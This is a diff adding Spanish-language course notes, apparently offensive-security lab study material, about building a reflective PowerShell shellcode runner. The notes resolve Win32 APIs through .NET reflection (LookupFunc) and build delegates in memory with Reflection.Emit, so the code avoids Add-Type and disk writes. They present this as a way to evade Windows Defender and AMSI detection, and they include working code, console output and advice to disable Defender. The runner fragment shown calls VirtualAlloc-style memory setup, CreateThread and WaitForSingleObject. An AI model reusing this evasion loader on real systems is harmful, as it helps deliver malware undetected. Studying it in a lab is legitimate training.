@@ -200,10 +200,10 @@ Al final, usan esta API para pausar el script de PowerShell y evitar que la cons
 ⚠️ ¿Por qué se usa esto en ciberseguridad ofensiva?
 El objetivo de este script es evadir la detección basada en firmas. Al eliminar Add-Type y DllImport, el script ya no contiene las palabras clave que Windows Defender busca para bloquear scripts maliciosos. Es una técnica clásica de "Living off the Land" (LotL) y evasión de AMSI.
 
-¿Funciona en tu laboratorio?
+¿Funciona del laboratorio?
 Depende de la versión de Windows Defender. Aunque este script evade la detección estática (de texto), Windows Defender moderno también tiene detección de comportamiento. Si ve que un proceso de PowerShell llama a VirtualAlloc con permisos RWX y luego a CreateThread, te bloqueará igual, aunque el script no contenga las palabras prohibidas.
 
-Conclusión: Este script es un paso más en la escalera de la evasión. Para que funcione en tu laboratorio, necesitas que Windows Defender esté totalmente desactivado (o hayas añadido exclusiones para powershell.exe y powershell_ise.exe). Si quieres probarlo, asegúrate de reemplazar el $buf completo (el que tienes tiene puntos suspensivos ... y fallará).
+Conclusión: Este script es un paso más en la escalera de la evasión. Para que funcione en el laboratorio, necesitas que Windows Defender esté totalmente desactivado (o hayas añadido exclusiones para powershell.exe y powershell_ise.exe). Si quieres probarlo, asegúrate de reemplazar el $buf completo
 
 ```
 function LookupFunc {
@@ -253,3 +253,339 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
+
+
+
+
+1. El Problema: Add-Type es ruidoso
+El texto empieza recordando que antes usábamos Add-Type y DllImport para importar funciones. Pero eso genera compilación en disco. La alternativa es usar Dynamic Lookup (Búsqueda Dinámica), que es lo que hacen los lenguajes de bajo nivel como C.
+
+2. La Solución: Reflexión en .NET (UnsafeNativeMethods)
+En lugar de compilar código nuevo, el texto propone abusar de código que ya está cargado en memoria.
+
+Windows tiene una clase interna dentro de System.dll llamada Microsoft.Win32.UnsafeNativeMethods. Esta clase ya contiene los métodos GetModuleHandle y GetProcAddress, que son las funciones de Windows que nos permiten encontrar otras funciones.
+
+El problema es que son métodos privados/internos de .NET. No podemos llamarlos directamente. Ahí entra la Reflexión (Reflection).
+
+3. El Proceso Paso a Paso
+Paso A: Encontrar el ensamblado correcto
+El script busca entre todos los ensamblados cargados ([AppDomain]::CurrentDomain.GetAssemblies()) y filtra para encontrar System.dll. Luego, obtiene una referencia a la clase UnsafeNativeMethods usando .GetType().
+
+Paso B: Resolver GetModuleHandle
+Usa .GetMethod('GetModuleHandle') para obtener una referencia al método interno. Luego lo invoca con .Invoke($null, @("user32.dll")).
+
+Esto devuelve la dirección base de user32.dll en la memoria. El texto verifica esto usando Process Explorer para ver que la dirección coincide con la real.
+
+Paso C: Resolver GetProcAddress (El error "Ambiguous match")
+Aquí hay un detalle técnico importante. Al intentar hacer .GetMethod('GetProcAddress'), da error porque hay múltiples versiones de esa función en la clase.
+
+Solución: Usar .GetMethods() (plural) y filtrar con un bucle ForEach-Object para quedarse solo con las que se llamen "GetProcAddress". Se queda con la primera ($tmp[0]).
+
+Paso D: Encontrar una función específica
+Ahora que tienen GetModuleHandle y GetProcAddress, los combinan:
+
+Obtienen la dirección de user32.dll con GetModuleHandle.
+
+Le pasan esa dirección a GetProcAddress junto con el nombre de la función que buscan ("MessageBoxA").
+
+Resultado: Obtienen la dirección de memoria exacta de MessageBoxA (un número decimal que parece basura, pero es la dirección real).
+
+Paso E: Crear la función LookupFunc
+Para no repetir todo ese código cada vez, lo meten en una función llamada LookupFunc. Ahora, cada vez que necesiten la dirección de cualquier función de Windows (como VirtualAlloc o CreateThread), solo tienen que llamar a LookupFunc kernel32.dll VirtualAlloc.
+
+💡 ¿Por qué esto es importante para tu Shellcode Runner?
+Este texto es la base teórica de lo que vimos en el script "Reflective Loader" que mostramos antes.
+
+Antes: Usabas Add-Type para declarar VirtualAlloc y CreateThread. Esto escribía en disco y AMSI te detectaba.
+
+Ahora: Usas LookupFunc para obtener las direcciones de VirtualAlloc y CreateThread en memoria. No hay compilación, no hay escritura en disco, y el script pasa mucho más desapercibido para Windows Defender.
+
+El siguiente paso (que menciona el final del texto) es usar esos punteros de memoria que encontraste y convertirlos en "Delegados" (usando GetDelegateType) para poder llamarlos como si fueran funciones normales de PowerShell.
+
+En resumen: Este texto te enseña a construir tu propio "buscador de funciones de Windows" usando solo lo que ya está en memoria, evadiendo así la detección estática de antivirus.
+
+Exercises
+Go through the PowerShell code in this section and dump the wanted methods to disclose the location of GetModuleHandle and GetProcAddress and perform a lookup of a different Win32 API.
+What happens if we use the second entry in the $tmp array?
+
+ Ejercicio 1: Dump de métodos, localizar GetModuleHandle/GetProcAddress y buscar una API diferente
+El objetivo es replicar el proceso de reflexión para encontrar las direcciones de memoria de las funciones, pero en lugar de buscar MessageBoxA en user32.dll, buscaremos VirtualAlloc en kernel32.dll.
+
+Copia y pega esto en tu PowerShell ISE (preferiblemente de 32 bits si sigues usando shellcode de 32 bits):
+```
+PS C:\Users\administrator> $Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
+PS C:\Users\administrator> $systemdll = $Assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+PS C:\Users\administrator> $unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
+PS C:\Users\administrator> # Dump
+PS C:\Users\administrator> $unsafeObj.GetMethods() | Where-Object { $_.Name -eq "GetModuleHandle" -or $_.Name -eq "GetProcAddress" } | Select-Object Name, ReturnType, IsStatic, IsPublic
+
+Name            ReturnType    IsStatic IsPublic
+----            ----------    -------- --------
+GetModuleHandle System.IntPtr     True     True
+GetProcAddress  System.IntPtr     True     True
+GetProcAddress  System.IntPtr     True     True
+
+
+PS C:\Users\administrator> $GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
+PS C:\Users\administrator> $GetProcAddressArr = @()
+PS C:\Users\administrator> $unsafeObj.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $GetProcAddressArr += $_ } }
+PS C:\Users\administrator> $GetProcAddress = $GetProcAddressArr[0] # Using the first one as recommended
+PS C:\Users\administrator>
+PS C:\Users\administrator> $kernel32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
+PS C:\Users\administrator> $VirtualAllocAddr = $GetProcAddress.Invoke($null, @($kernel32, "VirtualAlloc"))
+PS C:\Users\administrator> Write-Output "Base address of kernel32.dll: 0x$($kernel32.ToString('X'))"
+Base address of kernel32.dll: 0x7FFCE6630000
+PS C:\Users\administrator> Write-Output "Address of VirtualAlloc: 0x$($VirtualAllocAddr.ToString('X'))"
+Address of VirtualAlloc: 0x7FFCE6648840
+```
+
+¿Qué hace esto?
+
+Utiliza la reflexión de .NET para acceder a métodos que normalmente son privados o internos (UnsafeNativeMethods).
+
+Obtiene la dirección base de kernel32.dll en la memoria del proceso actual.
+
+Usa esa dirección base junto con el nombre de la función "VirtualAlloc" para obtener la dirección exacta de memoria donde vive esa función en tu sistema.
+
+Verás que devuelve un número decimal (que al convertirlo a hexadecimal, empieza con 0x7...), lo que confirma que la resolución fue exitosa.
+
+❓ Ejercicio 2: ¿Qué pasa si usamos la segunda entrada en el array $tmp?
+Si cambias $GetProcAddress = $tmp[0] por $GetProcAddress = $tmp[1], el script fallará o devolverá un valor nulo (0) cuando intentes invocarlo con un nombre de función (como "VirtualAlloc").
+
+¿Por qué ocurre esto?
+El error "Ambiguous match found" que vimos en el texto ocurre porque en C/C++ la función GetProcAddress tiene dos sobrecargas (overloads) distintas en la API de Windows:
+
+GetProcAddress(HMODULE hModule, LPCSTR lpProcName): Recibe el nombre de la función como una cadena de texto (String).
+
+GetProcAddress(HMODULE hModule, WORD Ordinal): Recibe el número de orden (Ordinal) de la función como un entero (IntPtr/Integer).
+
+En .NET, cuando se crean los wrappers para estas APIs, se generan dos métodos distintos con el mismo nombre pero diferentes firmas. El array $tmp contiene ambos.
+
+$tmp[0] es el método que acepta un String (por eso funciona pasarle "VirtualAlloc").
+
+$tmp[1] es el método que acepta un IntPtr (un número ordinal).
+
+Si usas el segundo método y le pasas una cadena de texto como "VirtualAlloc", .NET lanzará un error de tipo (Type mismatch) o simplemente fallará porque espera un número entero, no una cadena.
+
+Conclusión: Siempre debes usar $tmp[0] a menos que quieras resolver funciones por su número ordinal en lugar de por su nombre.
+
+## DelegateType Reflection
+El siguiente texto es la segunda pieza del rompecabezas para crear un shellcode runner reflectivo (que no toca el disco).
+
+Si en el texto anterior aprendimos a encontrar la dirección de memoria de una función de Windows (como MessageBoxA o VirtualAlloc) usando reflexión, ahora nos enfrentamos al siguiente problema: sabemos dónde está, pero no sabemos cómo llamarla.
+
+En C#, para llamar a una función de una DLL nativa se usa la palabra clave delegate (delegado), que básicamente le dice a .NET: "Esta dirección de memoria recibe estos argumentos y devuelve este tipo de dato". Pero PowerShell no tiene la palabra clave delegate.
+
+Para solucionarlo, este texto explica cómo construir un tipo de dato "Delegado" en memoria desde cero usando System.Reflection.Emit. Es un proceso largo y manual, pero es 100% en memoria (no escribe nada en disco).
+
+🧱 Fase 1: Construir la "Fábrica" en Memoria (Listings 80-82)
+Imagina que vas a construir un coche. Necesitas una fábrica (Assembly), una línea de ensamblaje (Module) y un molde (Type).
+
+New-Object System.Reflection.AssemblyName('ReflectedDelegate'): Le das un nombre a tu fábrica ficticia.
+
+DefineDynamicAssembly(..., AssemblyBuilderAccess::Run): Creas la fábrica, pero le dices que solo viva en memoria (Run), que no se guarde en disco.
+
+DefineDynamicModule('InMemoryModule', $false): Dentro de la fábrica, creas un módulo (la línea de ensamblaje). El $false significa que no necesitas guardar archivos de símbolos (debug).
+
+DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]): Aquí creas el "molde". Le pones de nombre MyDelegateType. Lo importante es que hereda de [System.MulticastDelegate], que es la clase base de .NET para todos los delegados.
+
+⚙️ Fase 2: Definir el "Contrato" (Los Argumentos) (Listings 84-85)
+Ahora que tienes el molde, necesitas decirle qué tipo de funciones puede representar. Para MessageBoxA, necesitas definir un constructor (la firma de la función).
+
+DefineConstructor(...):
+
+'RTSpecialName, HideBySig, Public': Son los atributos obligatorios para un constructor de delegado.
+
+[System.Reflection.CallingConventions]::Standard: La convención de llamada estándar de Windows (cómo se pasan los argumentos por la pila).
+
+@([IntPtr], [String], [String], [int]): Aquí está la clave. Le pasas un array con los tipos de datos exactos que recibe MessageBoxA (un puntero, dos strings y un entero).
+
+SetImplementationFlags('Runtime, Managed'): Le dices a .NET que este código se ejecutará en tiempo de ejecución (Runtime) y que es código administrado (Managed).
+
+📞 Fase 3: Definir el "Método de Invocación" (Listings 86-87)
+El constructor definió los argumentos de entrada, pero falta definir qué devuelve la función y cómo se llama.
+
+DefineMethod('Invoke', ...):
+
+'Public, HideBySig, NewSlot, Virtual': Atributos del método (público, virtual, etc.).
+
+[int]: El tipo de dato que devuelve MessageBoxA (un entero).
+
+@([IntPtr], [String], [String], [int]): Los mismos argumentos de entrada que definimos en el constructor.
+
+SetImplementationFlags('Runtime, Managed'): Igual que antes, indicando que es código en tiempo de ejecución.
+
+$MyDelegateType = $MyTypeBuilder.CreateType(): ¡La fábrica termina de construir el molde! Ahora tienes un tipo de dato llamado MyDelegateType listo para usarse.
+
+🔗 Fase 4: El Enlace Final (Listing 88)
+Ahora que tienes la dirección de memoria ($MessageBoxA) y el molde del delegado ($MyDelegateType), los unes:
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType): Esta función de .NET toma la dirección de memoria y el tipo de delegado, y crea un objeto que puedes llamar como si fuera una función normal de PowerShell ($MyFunction).
+
+$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0): ¡Ejecutas la API de Windows! Le pasas los argumentos exactos que definiste en el molde (0, "Hello World", "This is My MessageBox", 0) y MessageBoxA se ejecuta sin haber usado Add-Type ni haber escrito nada en disco.
+
+💡 ¿Por qué esto es tan importante para el Shellcode Runner?
+Este es el "pegamento" que faltaba. En el script final (que vimos en el archivo anterior), en lugar de definir un delegado para MessageBoxA, definimos delegados para VirtualAlloc, RtlMoveMemory y CreateThread.
+
+Para VirtualAlloc, el molde sería: @([IntPtr], [UInt32], [UInt32], [UInt32]) y devuelve [IntPtr].
+
+Para CreateThread, el molde sería: @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) y devuelve [IntPtr].
+
+Al usar GetDelegateForFunctionPointer con estos moldes, PowerShell puede llamar a las APIs de Windows como si fueran funciones nativas de .NET, pero todo ocurre en la memoria RAM del proceso de PowerShell.
+
+En resumen: Este texto te enseña a falsificar los tipos de datos de funciones de Windows en memoria para poder ejecutarlas sin que Windows Defender te detecte el DllImport o la escritura de archivos temporales de Add-Type. Es la técnica de evasión definitiva para scripts de PowerShell.
+```
+# ==========================================================
+# 1. FUNCIÓN LOOKUP: Encuentra la dirección de cualquier API
+# ==========================================================
+function LookupFunc {
+    Param ($moduleName, $functionName)
+
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+# ==========================================================
+# 2. RESOLVER LA DIRECCIÓN DE MessageBoxA EN user32.dll
+# ==========================================================
+$MessageBoxA = LookupFunc user32.dll MessageBoxA
+
+# ==========================================================
+# 3. CONSTRUIR EL DELEGADO EN MEMORIA (Sin Add-Type)
+# ==========================================================
+$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+$Domain = [AppDomain]::CurrentDomain
+$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
+  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
+  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+# --- Definir el constructor (los argumentos de entrada) ---
+$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
+  'RTSpecialName, HideBySig, Public', 
+    [System.Reflection.CallingConventions]::Standard, 
+      @([IntPtr], [String], [String], [int]))
+$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+
+# --- Definir el método Invoke (el tipo de retorno) ---
+$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
+  'Public, HideBySig, NewSlot, Virtual', 
+    [int], 
+      @([IntPtr], [String], [String], [int]))
+$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
+
+# --- Crear el tipo de dato (el "molde") ---
+$MyDelegateType = $MyTypeBuilder.CreateType()
+
+# ==========================================================
+# 4. ENLAZAR DIRECCIÓN + DELEGADO Y EJECUTAR
+# ==========================================================
+$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
+$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
+```
+
+⚠️ Notas importantes:
+Si ejecutas el script dos veces en la misma sesión de ISE, te dará error porque el tipo MyDelegateType ya existe. Cierra y vuelve a abrir ISE antes de cada prueba.
+
+Verifica tu arquitectura: Si estás en un ISE de 64 bits, las direcciones de memoria serán de 64 bits. Si estás en uno de 32 bits, de 32 bits. Ambos funcionan, pero asegúrate de usar el ISE correcto (en la captura del texto original usaban el de 32 bits: C:\Windows\SysWOW64\WindowsPowerShell\v1.0).
+
+Si Windows Defender te bloquea el script, es porque AMSI está escaneando la cadena "MessageBoxA" o "GetProcAddress". Para tus pruebas de laboratorio, añade una exclusión o desactiva la protección en tiempo real.
+
+Exercises
+Use the PowerShell code to call MessageBoxA using reflection instead of Add-Type.
+Use Process Monitor to verify that no C# source code is written to disk or compiled.
+The Win32 WinExec API can be used to launch applications. Modify the existing code to resolve and call WinExec and open Notepad. Use resources such as MSDN and P/Invoke to understand the arguments for the function and the associated data types.
+
+Descarga Process Monitor de la página de Microsoft Sysinternals y ejecútalo como Administrador.
+
+En la barra de herramientas, haz clic en el icono de embudo (Filter) y añade estos filtros:
+
+Process Name is powershell_ise.exe (o powershell.exe).
+
+Operation is CreateFile (o Process Create).
+
+Deja ProcMon corriendo.
+
+Ejecuta el script de PowerShell del Ejercicio 1.
+
+Verás que aparece el MessageBox, pero en ProcMon NO deberías ver ninguna operación de escritura de archivos .cs ni la ejecución del compilador csc.exe.
+
+Comparación: Si ejecutas un script con Add-Type, verás en ProcMon que se crea un archivo .cs en %TEMP% y se lanza csc.exe. Con la técnica de reflexión, eso desaparece por completo. Todo ocurre en memoria.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5d1c2642-a62d-4a03-918d-f968092500b7" />
+
+ Ejercicio 3: Resolver y llamar a WinExec para abrir Notepad
+Para este ejercicio, necesitamos entender la firma de WinExec:
+
+Según MSDN y P/Invoke:
+```
+UINT WinExec(
+  LPCSTR lpCmdLine,  // String (Puntero a cadena de texto)
+  UINT   uCmdShow    // UInt32 (Entero sin signo)
+);
+```
+
+lpCmdLine: Es una cadena de texto normal, en .NET se traduce como [String].
+
+uCmdShow: Es un entero sin signo de 32 bits, en .NET se traduce como [UInt32].
+
+Retorno: Devuelve un UINT ([UInt32]).
+
+El valor 1 para uCmdShow equivale a SW_SHOWNORMAL (abrir la ventana en su tamaño y posición normales).
+
+Aquí tienes el código completo. Fíjate en cómo cambiamos los tipos de datos en el DefineConstructor y DefineMethod para que coincidan con WinExec:
+```
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+# 1. Resolver la dirección de WinExec en kernel32.dll
+$WinExec = LookupFunc kernel32.dll WinExec
+
+# 2. Construir el Delegado en memoria para WinExec
+$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+$Domain = [AppDomain]::CurrentDomain
+$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateTypeWinExec', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+# --- Constructor: Recibe [String] lpCmdLine y [UInt32] uCmdShow ---
+$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
+  'RTSpecialName, HideBySig, Public', 
+    [System.Reflection.CallingConventions]::Standard, 
+      @([String], [UInt32])) 
+$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+
+# --- Método Invoke: Devuelve [UInt32] ---
+$MyMethodBuilder = $MyTypeBuilder.DefineMethod(
+  'Invoke', 
+  'Public, HideBySig, NewSlot, Virtual', 
+    [UInt32], 
+      @([String], [UInt32])) 
+$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
+
+$MyDelegateType = $MyTypeBuilder.CreateType()
+
+# 3. Enlazar y ejecutar WinExec
+$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WinExec, $MyDelegateType)
+
+# Invocamos: "notepad.exe" como comando, y 1 como SW_SHOWNORMAL
+Write-Host "[*] Lanzando Notepad..." -ForegroundColor Cyan
+$MyFunction.Invoke("notepad.exe", 1)
+```
+
+🔍 ¿Por qué funciona?
+Al cambiar el array de tipos en DefineConstructor y DefineMethod a @([String], [UInt32]), le estamos diciendo a .NET exactamente cómo debe empaquetar los argumentos cuando llame a la dirección de memoria de WinExec. Si pones los tipos incorrectos (por ejemplo, [IntPtr] en lugar de [String]), el script fallará o crasheará PowerShell.
+
+¡Con esto completas los tres ejercicios! Ahora ya sabes cómo ejecutar cualquier API de Windows en memoria sin tocar el disco y sin usar Add-Type.
+
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5240898f-0616-4327-b0fa-be26a6590463" />
